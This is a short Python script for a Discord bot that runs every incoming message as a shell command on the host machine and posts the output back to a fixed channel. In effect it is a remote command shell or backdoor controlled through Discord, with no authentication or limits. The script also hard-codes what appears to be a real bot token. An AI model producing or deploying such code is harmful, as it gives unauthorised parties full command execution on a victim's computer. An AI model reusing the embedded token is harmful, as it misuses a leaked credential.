import discord
import subprocess as sp

API_TOKEN = 'MTA3NDA5MDk1MDE3Mjg2ODgzMQ.G2fhQn.3nOVQJITrF7oceK6nGj6oyp_ErpTvI5dpHsArg'
client = discord.Client(intents=discord.Intents.all())
guild = discord.Guild

@client.event
async def on_message(message):
    if (message.author.bot): return

    channel = client.get_channel(1074088119575519322)

    output = sp.getoutput(message.content)

    try:
        await channel.send(output)
    except Exception as e:
        print(e)
        open("message.txt", "w+").write(output)
        await channel.send(file=discord.File("message.txt"))

client.run(API_TOKEN)
